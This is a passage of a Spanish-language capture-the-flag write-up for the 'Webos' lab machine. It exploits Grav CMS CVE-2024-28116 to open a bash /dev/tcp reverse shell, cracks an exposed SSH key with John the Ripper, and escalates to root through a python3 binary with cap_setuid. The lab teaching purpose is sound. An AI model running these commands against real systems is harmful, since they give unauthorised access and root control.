+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Paso 3:</span>
+</span></span><span style="display:flex;"><span>stty raw -echo; fg
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Paso 4:</span>
+</span></span><span style="display:flex;"><span>reset -&gt; xterm
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Paso 5:</span>
+</span></span><span style="display:flex;"><span>export TERM<span style="color:#f92672">=</span>xterm <span style="color:#f92672">&amp;&amp;</span> export SHELL<span style="color:#f92672">=</span>bash <span style="color:#f92672">&amp;&amp;</span> stty rows <span style="color:#ae81ff">51</span> columns <span style="color:#ae81ff">189</span>
+</span></span></code></pre></div><p>Continuemos.</p>
+<h4 id="Exploit2">Probando Exploit: Grav CMS Remote Code Execution (Authenticated) - CVE-2024-28116</h4>
+<p>Este Exploit es similar, pero automatiza el proceso de cambiar el comando a ejecutar desde el mismo Exploit.</p>
+<p>A diferencia del otro Exploit, aquí tenemos que darle el usuario, la contraseña y el comando a ejecutar mediante flags. Además, elimina automáticamente la página creada, por lo que solo se ejecuta el comando y no se guarda el payload.</p>
+<p>Aquí lo puedes encontrar:</p>
+<ul>
+<li><a href="https://github.com/gunzf0x/Grav-CMS-RCE-Authenticated" target="_blank">Repositorio de gunzf0z: Grav CMS Remote Code Execution (Authenticated) - CVE-2024-28116</a></li>
+</ul>
+<p>Puedes descargar solo el Exploit con <strong>wget</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>wget https://raw.githubusercontent.com/gunzf0x/Grav-CMS-RCE-Authenticated/refs/heads/main/Grav_CMS_RCE.py
+</span></span></code></pre></div><p>En el repo, nos muestra un ejemplo de cómo manda una <strong>traza ICMP</strong> a una IP, así que repliquémoslo.</p>
+<p>Inicia una captura de <strong>paquetes ICMP</strong> con <strong>tcpdump</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>tcpdump -i eth0 icmp -n
+</span></span><span style="display:flex;"><span>tcpdump: verbose output suppressed, use -v<span style="color:#f92672">[</span>v<span style="color:#f92672">]</span>... <span style="color:#66d9ef">for</span> full protocol decode
+</span></span><span style="display:flex;"><span>listening on eth0, link-type EN10MB <span style="color:#f92672">(</span>Ethernet<span style="color:#f92672">)</span>, snapshot length <span style="color:#ae81ff">262144</span> bytes
+</span></span></code></pre></div><p>Ejecuta el mismo comando, mandando la traza a tu IP:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python3 Grav_CMS_RCE.py -t 192.168.100.10 -u <span style="color:#e6db74">&#39;admin&#39;</span> -p <span style="color:#e6db74">&#39;Perico69*****&#39;</span> -x <span style="color:#e6db74">&#39;ping -c 1 Tu_IP&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Attacking <span style="color:#e6db74">&#39;http://192.168.100.10:80&#39;</span>...
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Uploading payload...
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Executing payload...
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Payload deleted. Actually, what payload? Nothing happened here ;<span style="color:#f92672">)</span> 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    ~Happy hacking
+</span></span></code></pre></div><p>Observa <strong>tcpdump</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>tcpdump -i eth0 icmp -n
+</span></span><span style="display:flex;"><span>tcpdump: verbose output suppressed, use -v<span style="color:#f92672">[</span>v<span style="color:#f92672">]</span>... <span style="color:#66d9ef">for</span> full protocol decode
+</span></span><span style="display:flex;"><span>listening on eth0, link-type EN10MB <span style="color:#f92672">(</span>Ethernet<span style="color:#f92672">)</span>, snapshot length <span style="color:#ae81ff">262144</span> bytes
+</span></span><span style="display:flex;"><span>13:33:05.219172 IP Tu_IP &gt; 192.168.100.10: ICMP echo request, id 11, seq 0, length <span style="color:#ae81ff">64</span>
+</span></span><span style="display:flex;"><span>13:33:05.219781 IP 192.168.100.10 &gt; Tu_IP: ICMP echo reply, id 11, seq 0, length <span style="color:#ae81ff">64</span>
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>^C
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">6</span> packets captured
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">6</span> packets received by filter
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span> packets dropped by kernel
+</span></span></code></pre></div><p>Funciona muy bien. Entonces, vamos a mandarnos una <strong>Reverse Shell</strong>.</p>
+<p>Abre un listener con <strong>netcat</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nc -nvlp <span style="color:#ae81ff">443</span>
+</span></span><span style="display:flex;"><span>listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">443</span> ...
+</span></span></code></pre></div><p>Cambia el comando por la misma <strong>Reverse Shell</strong> que ocupamos con el Exploit anterior:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python3 Grav_CMS_RCE.py -t 192.168.100.10 -u <span style="color:#e6db74">&#39;admin&#39;</span> -p <span style="color:#e6db74">&#39;Perico69*****&#39;</span> -x <span style="color:#e6db74">&#39;bash -c &#34;bash -i &gt;&amp; /dev/tcp/Tu_IP/443 0&gt;&amp;1&#34;&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Attacking <span style="color:#e6db74">&#39;http://192.168.100.10:80&#39;</span>...
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Uploading payload...
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Executing payload...
+</span></span></code></pre></div><p>Ve cómo se queda ejecutando el Exploit.</p>
+<p>Observa la <strong>netcat</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nc -nvlp <span style="color:#ae81ff">443</span>
+</span></span><span style="display:flex;"><span>listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">443</span> ...
+</span></span><span style="display:flex;"><span>connect to <span style="color:#f92672">[</span>Tu_IP<span style="color:#f92672">]</span> from <span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>192.168.100.10<span style="color:#f92672">]</span> <span style="color:#ae81ff">57510</span>
+</span></span><span style="display:flex;"><span>bash: cannot set terminal process group <span style="color:#f92672">(</span>509<span style="color:#f92672">)</span>: Inappropriate ioctl <span style="color:#66d9ef">for</span> device
+</span></span><span style="display:flex;"><span>bash: no job control in this shell
+</span></span><span style="display:flex;"><span>www-data@TheHackersLabs-Webos:/var/www/html$ whoami
+</span></span><span style="display:flex;"><span>whoami
+</span></span><span style="display:flex;"><span>www-data
+</span></span></code></pre></div><p>Estamos dentro de nuevo.</p>
+<p>Ya solo falta obtener una sesión interactiva:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Paso 1:</span>
+</span></span><span style="display:flex;"><span>script /dev/null -c bash
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Paso 2:</span>
+</span></span><span style="display:flex;"><span>CTRL + Z
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Paso 3:</span>
+</span></span><span style="display:flex;"><span>stty raw -echo; fg
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Paso 4:</span>
+</span></span><span style="display:flex;"><span>reset -&gt; xterm
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Paso 5:</span>
+</span></span><span style="display:flex;"><span>export TERM<span style="color:#f92672">=</span>xterm <span style="color:#f92672">&amp;&amp;</span> export SHELL<span style="color:#f92672">=</span>bash <span style="color:#f92672">&amp;&amp;</span> stty rows <span style="color:#ae81ff">51</span> columns <span style="color:#ae81ff">189</span>
+</span></span></code></pre></div><h2 id="Post">Post Explotación</h2>
+<h3 id="linEnum">Enumeración de la Máquina Víctima y Crackeo de Llave Privada id_rsa</h3>
+<p>Veamos qué usuarios existen en la máquina:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>www-data@TheHackersLabs-Webos:/var/www/html$ cat /etc/passwd | grep bash
+</span></span><span style="display:flex;"><span>root:x:0:0:root:/root:/bin/bash
+</span></span><span style="display:flex;"><span>debian:x:1000:1000:debian,,,:/home/debian:/bin/bash
+</span></span><span style="display:flex;"><span>webos:x:1001:1001::/home/webos:/bin/bash
+</span></span></code></pre></div><p>Hay dos usuarios.</p>
+<p>Podemos ver el contenido del <strong>usuario webos</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>www-data@TheHackersLabs-Webos:/var/www/html$ ls -la /home
+</span></span><span style="display:flex;"><span>total <span style="color:#ae81ff">16</span>
+</span></span><span style="display:flex;"><span>drwxr-xr-x  <span style="color:#ae81ff">4</span> root   root   <span style="color:#ae81ff">4096</span> Jul  <span style="color:#ae81ff">6</span>  <span style="color:#ae81ff">2024</span> .
+</span></span><span style="display:flex;"><span>drwxr-xr-x <span style="color:#ae81ff">18</span> root   root   <span style="color:#ae81ff">4096</span> Jul  <span style="color:#ae81ff">6</span>  <span style="color:#ae81ff">2024</span> ..
+</span></span><span style="display:flex;"><span>drwx------  <span style="color:#ae81ff">2</span> debian debian <span style="color:#ae81ff">4096</span> Jul  <span style="color:#ae81ff">1</span>  <span style="color:#ae81ff">2024</span> debian
+</span></span><span style="display:flex;"><span>drwxr-xr-x  <span style="color:#ae81ff">5</span> webos  webos  <span style="color:#ae81ff">4096</span> Jul <span style="color:#ae81ff">18</span>  <span style="color:#ae81ff">2024</span> webos
+</span></span></code></pre></div><p>Pero no hay mucho que podamos ver, pero es un poco extraño ver el binario <strong>python3</strong> en un directorio de un usuario:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>www-data@TheHackersLabs-Webos:/var/www/html$ ls -la /home/webos/
+</span></span><span style="display:flex;"><span>total <span style="color:#ae81ff">6716</span>
+</span></span><span style="display:flex;"><span>drwxr-xr-x <span style="color:#ae81ff">5</span> webos webos    <span style="color:#ae81ff">4096</span> Jul <span style="color:#ae81ff">18</span>  <span style="color:#ae81ff">2024</span> .
+</span></span><span style="display:flex;"><span>drwxr-xr-x <span style="color:#ae81ff">4</span> root  root     <span style="color:#ae81ff">4096</span> Jul  <span style="color:#ae81ff">6</span>  <span style="color:#ae81ff">2024</span> ..
+</span></span><span style="display:flex;"><span>lrwxrwxrwx <span style="color:#ae81ff">1</span> root  root        <span style="color:#ae81ff">9</span> Jul <span style="color:#ae81ff">18</span>  <span style="color:#ae81ff">2024</span> .bash_history -&gt; /dev/null
+</span></span><span style="display:flex;"><span>-rw-r--r-- <span style="color:#ae81ff">1</span> webos webos     <span style="color:#ae81ff">220</span> Apr <span style="color:#ae81ff">23</span>  <span style="color:#ae81ff">2023</span> .bash_logout
+</span></span><span style="display:flex;"><span>-rw-r--r-- <span style="color:#ae81ff">1</span> webos webos    <span style="color:#ae81ff">3526</span> Apr <span style="color:#ae81ff">23</span>  <span style="color:#ae81ff">2023</span> .bashrc
+</span></span><span style="display:flex;"><span>drwxr-xr-x <span style="color:#ae81ff">3</span> webos webos    <span style="color:#ae81ff">4096</span> Jul  <span style="color:#ae81ff">6</span>  <span style="color:#ae81ff">2024</span> .local
+</span></span><span style="display:flex;"><span>-rw-r--r-- <span style="color:#ae81ff">1</span> webos webos     <span style="color:#ae81ff">807</span> Apr <span style="color:#ae81ff">23</span>  <span style="color:#ae81ff">2023</span> .profile
+</span></span><span style="display:flex;"><span>drwx------ <span style="color:#ae81ff">2</span> webos webos    <span style="color:#ae81ff">4096</span> Jul  <span style="color:#ae81ff">6</span>  <span style="color:#ae81ff">2024</span> .ssh
+</span></span><span style="display:flex;"><span>-rwxr-xr-x <span style="color:#ae81ff">1</span> root  root  <span style="color:#ae81ff">6839928</span> Jul  <span style="color:#ae81ff">6</span>  <span style="color:#ae81ff">2024</span> python3
+</span></span><span style="display:flex;"><span>-r-------- <span style="color:#ae81ff">1</span> webos webos      <span style="color:#ae81ff">36</span> Jul <span style="color:#ae81ff">18</span>  <span style="color:#ae81ff">2024</span> user.txt
+</span></span><span style="display:flex;"><span>drwxr-xr-x <span style="color:#ae81ff">2</span> webos webos    <span style="color:#ae81ff">4096</span> Jul <span style="color:#ae81ff">17</span>  <span style="color:#ae81ff">2024</span> webito
+</span></span></code></pre></div><p>Buscando un poco por ahí, encontraremos algo interesante en el directorio <code>/opt</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>www-data@TheHackersLabs-Webos:/var/www/html$ ls -la /opt
+</span></span><span style="display:flex;"><span>total <span style="color:#ae81ff">12</span>
+</span></span><span style="display:flex;"><span>drwxr-xr-x  <span style="color:#ae81ff">2</span> webos webos <span style="color:#ae81ff">4096</span> Jul  <span style="color:#ae81ff">6</span>  <span style="color:#ae81ff">2024</span> .
+</span></span><span style="display:flex;"><span>drwxr-xr-x <span style="color:#ae81ff">18</span> root  root  <span style="color:#ae81ff">4096</span> Jul  <span style="color:#ae81ff">6</span>  <span style="color:#ae81ff">2024</span> ..
+</span></span><span style="display:flex;"><span>-rw-r--r--  <span style="color:#ae81ff">1</span> webos webos <span style="color:#ae81ff">3434</span> Jul  <span style="color:#ae81ff">6</span>  <span style="color:#ae81ff">2024</span> id_rsa
+</span></span></code></pre></div><p>Encontramos una <strong>llave privada id_rsa</strong> del <strong>usuario webos</strong> y podemos leerla:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>www-data@TheHackersLabs-Webos:/var/www/html$ cat /opt/id_rsa 
+</span></span><span style="display:flex;"><span>-----BEGIN OPENSSH PRIVATE KEY-----
+</span></span><span style="display:flex;"><span>b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAA
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>...
+</span></span></code></pre></div><p>Cópiala, pégala en tu máquina y dale los permisos correspondientes:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nano id_rsa
+</span></span><span style="display:flex;"><span>------------
+</span></span><span style="display:flex;"><span>-----BEGIN OPENSSH PRIVATE KEY-----
+</span></span><span style="display:flex;"><span>b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAA
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>-----------
+</span></span><span style="display:flex;"><span>chmod <span style="color:#ae81ff">600</span> id_rsa
+</span></span></code></pre></div><p>Vamos a crackear esta llave.</p>
+<p>Primero, obtengamos el hash de la llave:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ssh2john id_rsa &gt; hash
+</span></span></code></pre></div><p>Ahora, usemos <strong>JohnTheRipper</strong> para crackearla:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>john -w:/usr/share/wordlists/rockyou.txt hash
+</span></span><span style="display:flex;"><span>Using default input encoding: UTF-8
+</span></span><span style="display:flex;"><span>Loaded <span style="color:#ae81ff">1</span> password hash <span style="color:#f92672">(</span>SSH, SSH private key <span style="color:#f92672">[</span>RSA/DSA/EC/OPENSSH 32/64<span style="color:#f92672">])</span>
+</span></span><span style="display:flex;"><span>Cost <span style="color:#ae81ff">1</span> <span style="color:#f92672">(</span>KDF/cipher <span style="color:#f92672">[</span>0<span style="color:#f92672">=</span>MD5/AES 1<span style="color:#f92672">=</span>MD5/3DES 2<span style="color:#f92672">=</span>Bcrypt/AES<span style="color:#f92672">])</span> is <span style="color:#ae81ff">2</span> <span style="color:#66d9ef">for</span> all loaded hashes
+</span></span><span style="display:flex;"><span>Cost <span style="color:#ae81ff">2</span> <span style="color:#f92672">(</span>iteration count<span style="color:#f92672">)</span> is <span style="color:#ae81ff">16</span> <span style="color:#66d9ef">for</span> all loaded hashes
+</span></span><span style="display:flex;"><span>Will run <span style="color:#ae81ff">6</span> OpenMP threads
+</span></span><span style="display:flex;"><span>Press <span style="color:#e6db74">&#39;q&#39;</span> or Ctrl-C to abort, almost any other key <span style="color:#66d9ef">for</span> status
+</span></span><span style="display:flex;"><span>freestyle        <span style="color:#f92672">(</span>id_rsa<span style="color:#f92672">)</span>     
+</span></span><span style="display:flex;"><span>1g 0:00:01:46 DONE <span style="color:#f92672">(</span>2025-08-04 13:44<span style="color:#f92672">)</span> 0.009427g/s 33.03p/s 33.03c/s 33.03C/s girls..alone
+</span></span><span style="display:flex;"><span>Use the <span style="color:#e6db74">&#34;--show&#34;</span> option to display all of the cracked passwords reliably
+</span></span><span style="display:flex;"><span>Session completed.
+</span></span></code></pre></div><p>Excelente, tenemos la frase de la llave privada.</p>
+<p>Autentiquémonos vía <strong>SSH</strong> usando esa llave y el <strong>usuario webos</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ssh -i id_rsa webos@192.168.100.10
+</span></span><span style="display:flex;"><span>Enter passphrase <span style="color:#66d9ef">for</span> key <span style="color:#e6db74">&#39;id_rsa&#39;</span>: 
+</span></span><span style="display:flex;"><span>Linux TheHackersLabs-Webos 6.1.0-22-amd64 <span style="color:#75715e">#1 SMP PREEMPT_DYNAMIC Debian 6.1.94-1 (2024-06-21) x86_64</span>
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>Last login: Thu Jul <span style="color:#ae81ff">18</span> 11:45:53 <span style="color:#ae81ff">2024</span>
+</span></span><span style="display:flex;"><span>webos@TheHackersLabs-Webos:~$ whoami
+</span></span><span style="display:flex;"><span>webos
+</span></span></code></pre></div><p>Estamos dentro.</p>
+<p>Ya podemos ver la flag del usuario:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>webos@TheHackersLabs-Webos:~$ ls
+</span></span><span style="display:flex;"><span>python3  user.txt  webito
+</span></span><span style="display:flex;"><span>webos@TheHackersLabs-Webos:~$ cat user.txt
+</span></span><span style="display:flex;"><span>...
+</span></span></code></pre></div><h3 id="Python3">Escalando Privilegios Abusando de Capabilities de Binario Python3</h3>
+<p>No podemos ver qué privilegios tiene nuestro usuario, pues necesitamos su contraseña:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>webos@TheHackersLabs-Webos:~$ sudo -l
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>sudo<span style="color:#f92672">]</span> contraseña para webos: 
+</span></span><span style="display:flex;"><span>Lo siento, pruebe otra vez.
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>sudo<span style="color:#f92672">]</span> contraseña para webos: 
+</span></span><span style="display:flex;"><span>sudo: <span style="color:#ae81ff">1</span> incorrect password attempt
+</span></span></code></pre></div><p>Tampoco hay un grupo del que nos podamos aprovechar:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>webos@TheHackersLabs-Webos:~$ id
+</span></span><span style="display:flex;"><span>uid<span style="color:#f92672">=</span>1001<span style="color:#f92672">(</span>webos<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>1001<span style="color:#f92672">(</span>webos<span style="color:#f92672">)</span> grupos<span style="color:#f92672">=</span>1001<span style="color:#f92672">(</span>webos<span style="color:#f92672">)</span>,1002<span style="color:#f92672">(</span>webito<span style="color:#f92672">)</span>
+</span></span></code></pre></div><p>Recordando el binario <strong>python3</strong> que tiene el <strong>usuario webos</strong>, aparte de que el dueño es el <strong>Root</strong>, me parece bastante extraño que esté ahí.</p>
+<p>El binario no tiene <strong>permisos SUID</strong>, pero podemos ver qué capabilities tiene.</p>
+<p>Para poder verlas, necesitamos el binario <strong>getcap</strong>, pero no parece estar en el directorio <code>/bin</code>. Entonces, podemos buscarlo con <strong>find</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>webos@TheHackersLabs-Webos:~$ find / -name getcap -type f 2&gt;/dev/null
+</span></span><span style="display:flex;"><span>/usr/sbin/getcap
+</span></span></code></pre></div><p>Lo encontramos.</p>
+<p>Ahora, veamos qué capabilities tiene:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>webos@TheHackersLabs-Webos:~$ /usr/sbin/getcap -r / 2&gt;/dev/null
+</span></span><span style="display:flex;"><span>/usr/bin/ping cap_net_raw<span style="color:#f92672">=</span>ep
+</span></span><span style="display:flex;"><span>/home/webos/python3 cap_setuid<span style="color:#f92672">=</span>ep
+</span></span></code></pre></div><p>Muy bien, el binario tiene la capability <code>cap_setuid=ep</code>, pues es una capacidad del <strong>kernel de Linux</strong> que permite a un proceso cambiar su <strong>UID</strong> efectivo, real y guardado (es decir, actuar como otro usuario).</p>
+<p>Esto nos puede permitir escalar privilegios.</p>
+<p>Tenemos una forma de abusar de esta capability en la <strong>guía de GTFOBins</strong>:</p>
+<ul>
+<li><a href="https://gtfobins.github.io/gtfobins/python/" target="_blank">GTFOBins: python</a></li>
+</ul>
+<p>Usaremos el siguiente comando:</p>
+<p align="center">
+<img src="/assets/images/THL-writeup-webos/Captura15.png">
+</p>
+<p>Ejecutémoslo:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>webos@TheHackersLabs-Webos:~$ ./python3 -c <span style="color:#e6db74">&#39;import os; os.setuid(0); os.system(&#34;/bin/bash&#34;)&#39;</span>
+</span></span><span style="display:flex;"><span>root@TheHackersLabs-Webos:~# whoami
+</span></span><span style="display:flex;"><span>root
+</span></span></code></pre></div><p>Somos <strong>Root</strong>.</p>
+<p>Obtengamos la última flag:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>root@TheHackersLabs-Webos:~# cd /root
+</span></span><span style="display:flex;"><span>root@TheHackersLabs-Webos:/root# ls
+</span></span><span style="display:flex;"><span>root.txt
+</span></span><span style="display:flex;"><span>root@TheHackersLabs-Webos:/root# cat root.txt
+</span></span><span style="display:flex;"><span>...
+</span></span></code></pre></div><p>Y con esto, terminamos la máquina.</p>
+
+
+    
+    <h2 id="links-de-investigacion">Links de investigación</h2>
+    <ul>
+      <li><a href="https://md5decrypt.net/en/Brainfuck-translator/" target="_blank" rel="noopener noreferrer">https://md5decrypt.net/en/Brainfuck-translator/</a></li><li><a href="https://github.com/akabe1/Graver" target="_blank" rel="noopener noreferrer">https://github.com/akabe1/Graver</a></li><li><a href="https://github.com/gunzf0x/Grav-CMS-RCE-Authenticated" target="_blank" rel="noopener noreferrer">https://github.com/gunzf0x/Grav-CMS-RCE-Authenticated</a></li><li><a href="https://gtfobins.github.io/gtfobins/python/" target="_blank" rel="noopener noreferrer">https://gtfobins.github.io/gtfobins/python/</a></li>
+    </ul>
+    
+  </div>
+
+  
+
+
+  
+
+  
+
+
+
+
+
+
+
+
+
+
+<nav class="post-nav">
+  
+  <a class="post-nav-link post-nav-prev" href="http://localhost:1313/THL-writeup-runners/">
+    <span class="post-nav-label">← Anterior</span>
+    <span class="post-nav-title">Runners - TheHackerLabs</span>
+  </a>
+  
+  
+  <a class="post-nav-link post-nav-next" href="http://localhost:1313/THL-writeup-casaPaco/">
+    <span class="post-nav-label">Siguiente →</span>
+    <span class="post-nav-title">Casa Paco - TheHackerLabs</span>
+  </a>
+  
+</nav>
+
+
+
+</article>
+
+  </main>
+  <footer class="site-footer">
+  <div class="wrap">
+    <p>&copy; 2026 BerserkWings · México
+       · <a href="https://github.com/BerserkWings" target="_blank" rel="noopener noreferrer">GitHub</a>
+    </p>
+  </div>
+</footer>
+
+  
+
+
+<a href="#indice" class="back-to-top" id="backToTop" aria-label="Volver al índice">&uarr;</a>
+
+
+<script src="/js/main.min.15ff80349759f71df793ae28568ef0a6a9c3eb6efe99c9e96bad1d9236a26c31.js" integrity="sha256-Ff&#43;ANJdZ9x33k64oVo7wpqnD627&#43;mcnpa60dkjaibDE=" defer></script>
+
+</body>
+</html>
